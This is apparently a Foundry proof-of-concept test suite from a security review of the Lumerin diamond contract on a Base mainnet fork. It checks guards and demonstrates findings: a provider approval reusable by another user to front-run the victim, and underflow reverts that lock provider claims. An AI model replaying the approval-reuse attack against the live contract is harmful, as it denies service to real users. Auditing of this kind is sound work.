// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

struct Facet {
    address facetAddress;
    bytes4[] functionSelectors;
}
struct FacetCut {
    address facetAddress;
    uint8 action;
    bytes4[] functionSelectors;
}
struct Pool {
    uint256 initialReward;
    uint256 rewardDecrease;
    uint128 payoutStart;
    uint128 decreaseInterval;
}
struct Bid {
    address provider;
    bytes32 modelId;
    uint256 pricePerSecond;
    uint256 nonce;
    uint128 createdAt;
    uint128 deletedAt;
}
struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}
struct Provider {
    string endpoint;
    uint256 stake;
    uint128 createdAt;
    uint128 limitPeriodEnd;
    uint256 limitPeriodEarned;
    bool isDeleted;
}



interface IDiamond {
    function owner() external view returns (address);
    function facets() external view returns (Facet[] memory);
    function diamondCut(FacetCut[] calldata cut_, address init_, bytes calldata initCalldata_) external;
    function getRegistry() external view returns (address);
    function getFundingAccount() external view returns (address);
    function getMaxSessionDuration() external view returns (uint128);
    function getProvidersTotalClaimed() external view returns (uint256);
    function getComputeBalance(uint128 timestamp_) external view returns (uint256);
    function totalMORSupply(uint128 timestamp_) external view returns (uint256);
    function getTodaysBudget(uint128 timestamp_) external view returns (uint256);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function stipendToStake(uint256 stipend_, uint128 timestamp_) external view returns (uint256);
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function startOfTheDay(uint128 timestamp_) external pure returns (uint128);
    function getProviderMinimumStake() external view returns (uint256);
    function getModelMinimumStake() external view returns (uint256);
    function getBidFee() external view returns (uint256);
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
    function getBid(bytes32 bidId_) external view returns (Bid memory);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
    function getProvider(address provider_) external view returns (Provider memory);
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function providerDeregister(address provider_) external;
    function modelRegister(address modelOwner_, bytes32 baseModelId_, bytes32 ipfsCID_, uint256 fee_, uint256 amount_, string calldata name_, string[] memory tags_) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function deleteModelBid(bytes32 bidId_) external;
    function openSession(address user_, uint256 amount_, bool isDirectPaymentFromUser_, bytes calldata approvalEncoded_, bytes calldata signature_) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function __Delegation_init(address registry_) external;
    function __Marketplace_init(address token_, uint256 bidMinPricePerSecond_, uint256 bidMaxPricePerSecond_) external;
    function __SessionRouter_init(address fundingAccount_, uint128 maxSessionDuration_, Pool[] calldata pools_) external;
    function setRegistry(address registry_) external;
}

/// @notice Fase 2 Lane D3 — Lumerin diamond (Base) hunt PoCs.
/// Fork: Base block 56038769. All calls go through the diamond.
/// Attacker = unprivileged address, no owner/admin prank anywhere.
contract PocD3LumerinTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant CHAIN_ID = 8453;
    uint256 constant PRICE = 1e13; // 1e-5 MOR/s, within [1e10, 1e16]

    IDiamond internal diamond;
    uint256 internal providerPk = 0xB0B;
    uint256 internal userAPk = 0xA11CE;
    uint256 internal userBPk = 0xBEEF;
    address internal provider;
    address internal userA;
    address internal userB;
    address internal attacker;
    bytes32 internal modelId;

    function setUp() public {
        vm.createSelectFork("base", 56038769);
        diamond = IDiamond(DIAMOND);
        provider = vm.addr(providerPk);
        userA = vm.addr(userAPk);
        userB = vm.addr(userBPk);
        attacker = makeAddr("attacker");

        deal(MOR, provider, 1_000_000 ether);
        deal(MOR, userA, 1_000_000 ether);
        deal(MOR, userB, 1_000_000 ether);
        deal(MOR, attacker, 1_000_000 ether);

        // register provider + model (as provider)
        vm.startPrank(provider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        diamond.providerRegister(provider, 10_000 ether, "https://example.com:8080"); // large stake: limiter must not bind
        bytes32 baseModelId = keccak256("d3-test-model");
        modelId = diamond.getModelId(provider, baseModelId);
        diamond.modelRegister(provider, baseModelId, keccak256("cid"), 0, diamond.getModelMinimumStake(), "d3-test", new string[](0));
        vm.stopPrank();
        // fund users' approvals of the diamond for stake pull
        vm.prank(userA);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(userB);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
    }

    function _postBid() internal returns (bytes32 bidId) {
        vm.prank(provider);
        bidId = diamond.postModelBid(provider, modelId, PRICE);
    }

    function _ethSigned(bytes memory payload) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload)));
    }

    function _signApproval(address user_, bytes32 bidId_) internal view returns (bytes memory msg_, bytes memory sig_) {
        msg_ = abi.encode(bidId_, CHAIN_ID, user_, uint128(block.timestamp));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(providerPk, _ethSigned(msg_));
        sig_ = abi.encodePacked(r, s, v);
    }

    function _signReceipt(bytes32 sessionId_, uint256 signerPk) internal view returns (bytes memory msg_, bytes memory sig_) {
        msg_ = abi.encode(sessionId_, CHAIN_ID, uint128(block.timestamp), uint32(1000 * 1000), uint32(100));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, _ethSigned(msg_));
        sig_ = abi.encodePacked(r, s, v);
    }

    /// stake that funds roughly `duration_` of session at PRICE (1.5x margin)
    function _stakeForDuration(uint256 duration_) internal view returns (uint256) {
        uint256 stipend_ = duration_ * PRICE;
        uint256 total_ = diamond.totalMORSupply(uint128(block.timestamp));
        uint256 compute_ = diamond.getComputeBalance(uint128(block.timestamp));
        return ((stipend_ * total_ * 100) / compute_) * 3 / 2;
    }

    function _openAs(address user_, uint256 amount_, bytes32 bidId_) internal returns (bytes32 sessionId) {
        (bytes memory approval, bytes memory sig) = _signApproval(user_, bidId_);
        vm.prank(user_);
        sessionId = diamond.openSession(user_, amount_, false, approval, sig);
    }

    // ---- D3-01: re-initialization guard ----
    function test_D3_01_reinitGuarded() public {
        // attacker tries to re-init each facet and to swap the delegation registry
        vm.startPrank(attacker);
        vm.expectRevert();
        diamond.__Delegation_init(attacker);
        vm.expectRevert();
        diamond.__Marketplace_init(MOR, 1, 2);
        Pool[] memory pools = new Pool[](0);
        vm.expectRevert();
        diamond.__SessionRouter_init(attacker, 3600, pools);
        vm.expectRevert();
        diamond.setRegistry(attacker);
        // attacker diamondCut must revert (selector absent or owner-gated)
        FacetCut[] memory cut = new FacetCut[](0);
        vm.expectRevert();
        diamond.diamondCut(cut, address(0), "");
        vm.stopPrank();
        // registry untouched
        assertEq(diamond.getRegistry(), 0x00000000000000447e69651d841bD8D104Bed493);
    }

    // ---- D3-04: diamondCut selector absent from loupe ----
    function test_D3_04_noDiamondCutSelector() public {
        Facet[] memory facets = diamond.facets();
        assertEq(facets.length, 5);
        uint256 totalSelectors;
        for (uint256 i = 0; i < facets.length; i++) {
            for (uint256 j = 0; j < facets[i].functionSelectors.length; j++) {
                totalSelectors++;
                assertTrue(facets[i].functionSelectors[j] != bytes4(0x1f931c1c), "diamondCut present");
            }
        }
        assertEq(totalSelectors, 73);
    }

    // ---- D3-02: provider approval is NOT bound to the user (Renascence Lumerin-1 M-2 theme) ----
    function test_D3_02_approvalUserNotBound() public {
        bytes32 bidId = _postBid();
        uint256 amount = _stakeForDuration(4 hours);
        uint256 dur = diamond.getSessionEnd(amount, PRICE, uint128(block.timestamp)) - block.timestamp;
        assertGe(dur, 1 hours);

        // approval signed for userA, but userB opens the session with it
        (bytes memory approval, bytes memory sig) = _signApproval(userA, bidId);
        vm.prank(userB);
        bytes32 sessionId = diamond.openSession(userB, amount, false, approval, sig);
        assertEq(diamond.getSession(sessionId).user, userB);
        assertTrue(diamond.getIsProviderApprovalUsed(approval));
        // victim's own tx with the same approval now reverts (duplicate)
        vm.prank(userA);
        vm.expectRevert();
        diamond.openSession(userA, amount, false, approval, sig);
    }

    // ---- D3-03a: same-day session — used stake day-locks, no same-day recycle ----
    function test_D3_03a_sameDayLockHolds() public {
        bytes32 bidId = _postBid();
        uint256 amount = _stakeForDuration(4 hours);
        uint256 balBefore = IERC20(MOR).balanceOf(userA);
        bytes32 sessionId = _openAs(userA, amount, bidId);
        Session memory s = diamond.getSession(sessionId);
        // session stays within the same UTC day (fork time 07:55 UTC + ~6h)
        assertEq(diamond.startOfTheDay(s.openedAt), diamond.startOfTheDay(s.endsAt));

        vm.warp(s.endsAt + 1);
        (bytes memory receipt, bytes memory sig) = _signReceipt(sessionId, providerPk);
        uint256 balPreClose = IERC20(MOR).balanceOf(userA);
        vm.prank(userA);
        diamond.closeSession(receipt, sig);

        uint256 refund = IERC20(MOR).balanceOf(userA) - balPreClose;
        (uint256 available, uint256 hold) = diamond.getUserStakesOnHold(userA, 255);
        console.log("D3-03a stake", amount);
        console.log("D3-03a refund", refund);
        console.log("D3-03a hold", hold);
        assertEq(available, 0);
        assertEq(refund + hold, amount);
        // ~all of the used stake is locked until next UTC day (allow 10% ratio drift)
        assertGe(hold, (amount * 90) / 100);
        assertLe(refund, amount / 10);
        // cannot withdraw the hold before releaseAt
        vm.prank(userA);
        vm.expectRevert();
        diamond.withdrawUserStakes(userA, 255);
        // next UTC day: full withdrawal works
        vm.warp(diamond.startOfTheDay(s.endsAt) + 1 days);
        uint256 balPreW = IERC20(MOR).balanceOf(userA);
        vm.prank(userA);
        diamond.withdrawUserStakes(userA, 255);
        assertEq(IERC20(MOR).balanceOf(userA) - balPreW, hold);
        assertEq(balBefore, IERC20(MOR).balanceOf(userA));
    }

    // ---- D3-03b: midnight-spanning session — refund is only the pre-midnight portion ----
    function test_D3_03b_midnightSpanNoAmplification() public {
        uint256 dayStart = (block.timestamp / 86400) * 86400;
        vm.warp(dayStart + 23 hours + 50 minutes); // 23:50 UTC
        bytes32 bidId = _postBid();
        uint256 amount = _stakeForDuration(4 hours);
        bytes32 sessionId = _openAs(userA, amount, bidId);
        Session memory s = diamond.getSession(sessionId);
        assertEq(diamond.startOfTheDay(s.openedAt) + 1 days, diamond.startOfTheDay(s.endsAt));

        vm.warp(s.endsAt + 1);
        (bytes memory receipt, bytes memory sig) = _signReceipt(sessionId, providerPk);
        uint256 balPreClose = IERC20(MOR).balanceOf(userA);
        vm.prank(userA);
        diamond.closeSession(receipt, sig);
        uint256 refund = IERC20(MOR).balanceOf(userA) - balPreClose;
        (, uint256 hold) = diamond.getUserStakesOnHold(userA, 255);
        console.log("D3-03b stake", amount);
        console.log("D3-03b refund", refund);
        console.log("D3-03b hold", hold);
        assertEq(refund + hold, amount);
        // only the ~10 min pre-midnight slice is refunded immediately
        assertLe(refund, amount / 10);
        assertGe(hold, (amount * 85) / 100);

        // reopen same day (day 2) with the refund: new session must be ~the pre-midnight
        // slice only, NOT another full session (no amplification)
        bytes32 bidId2 = _postBid();
        (bytes memory approval2, bytes memory sig2) = _signApproval(userA, bidId2);
        vm.prank(userA);
        bytes32 sessionId2 = diamond.openSession(userA, refund, false, approval2, sig2);
        Session memory s2 = diamond.getSession(sessionId2);
        uint256 newDur = s2.endsAt - s2.openedAt;
        console.log("D3-03b newDur", newDur);
        console.log("D3-03b oldDur", s.endsAt - s.openedAt);
        assertLe(newDur, 20 minutes);
    }

    // ---- D3-05: provider claims exactly once; post-late-close claim reverts (underflow) ----
    function test_D3_05_providerClaimExactlyOnce() public {
        bytes32 bidId = _postBid();
        uint256 amount = _stakeForDuration(4 hours);
        bytes32 sessionId = _openAs(userA, amount, bidId);
        Session memory s = diamond.getSession(sessionId);
        uint256 entitlement = (s.endsAt - s.openedAt) * PRICE;

        // provider claims after expiry, before close
        vm.warp(s.endsAt + 1);
        uint256 provBefore = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        uint256 firstClaim = IERC20(MOR).balanceOf(provider) - provBefore;
        assertEq(firstClaim, entitlement);

        // user closes late; provider was paid in full at close, so a second
        // claim should be a no-op -- instead it REVERTS (panic 0x11):
        // _getProviderRewards(true) == 0 but _getProviderOnHoldAmount > 0
        (bytes memory receipt, bytes memory sig) = _signReceipt(sessionId, providerPk);
        vm.prank(userA);
        diamond.closeSession(receipt, sig);
        vm.prank(provider);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
        diamond.claimForProvider(sessionId);
        // after the next UTC midnight the hold is 0 and the call is a clean no-op
        vm.warp(diamond.startOfTheDay(s.endsAt) + 1 days + 1);
        uint256 provMid = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        assertEq(IERC20(MOR).balanceOf(provider), provMid);
    }

    function test_D3_05_disputeEarlyCloseNoUnderflow() public {
        bytes32 bidId = _postBid();
        uint256 amount = _stakeForDuration(4 hours);
        bytes32 sessionId = _openAs(userA, amount, bidId);
        Session memory s = diamond.getSession(sessionId);
        // close early (1h in) with a self-signed receipt -> dispute path
        vm.warp(s.openedAt + 1 hours);
        (bytes memory receipt, bytes memory sig) = _signReceipt(sessionId, userAPk);
        vm.prank(userA);
        diamond.closeSession(receipt, sig);
        Session memory s2 = diamond.getSession(sessionId);
        assertEq(s2.closeoutType, 1); // dispute
        assertEq(s2.closedAt, s.openedAt + 1 hours);
        // provider can still claim the non-held part, and the held part after a day
        uint256 entitlement = (s2.closedAt - s2.openedAt) * PRICE;
        uint256 provBefore = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        uint256 firstClaim = IERC20(MOR).balanceOf(provider) - provBefore;
        assertLe(firstClaim, entitlement);
        assertGe(firstClaim, 0);
        // after the hold expires (1 day after startOfDay(closedAt)) the held remainder is claimable
        vm.warp(diamond.startOfTheDay(s2.closedAt) + 1 days + 1);
        uint256 provMid = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        uint256 secondClaim = IERC20(MOR).balanceOf(provider) - provMid;
        assertEq(firstClaim + secondClaim, entitlement);
        // third claim: nothing left
        uint256 provEnd = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        assertEq(IERC20(MOR).balanceOf(provider), provEnd);
        assertTrue(entitlement > 0);
    }

    // ---- D3-06: provider deregisters with open sessions -> claims bricked, then 0 ----
    function test_D3_06_deregisterLocksEarnedClaims() public {
        bytes32 bidId = _postBid();
        uint256 amount = _stakeForDuration(4 hours);
        bytes32 sessionId = _openAs(userA, amount, bidId);
        // delete the bid (allowed despite the open session), then deregister
        vm.prank(provider);
        diamond.deleteModelBid(bidId);
        vm.prank(provider);
        diamond.providerDeregister(provider);
        Provider memory p = diamond.getProvider(provider);
        assertTrue(p.isDeleted);
        // session expires; close it late; provider claim must be 0 (stake == earned now)
        Session memory s = diamond.getSession(sessionId);
        vm.warp(s.endsAt + 1);
        (bytes memory receipt, bytes memory sig) = _signReceipt(sessionId, providerPk);
        vm.prank(userA);
        diamond.closeSession(receipt, sig);
        // claim before the next UTC midnight REVERTS (same late-close underflow as D3-05)
        vm.prank(provider);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
        diamond.claimForProvider(sessionId);
        // after midnight the call succeeds but pays 0: the 365-day limiter caps
        // claims at stake - earned, and deregister left stake == earned == 0
        vm.warp(diamond.startOfTheDay(s.endsAt) + 1 days + 1);
        uint256 provBefore = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        assertEq(IERC20(MOR).balanceOf(provider), provBefore);
    }
}
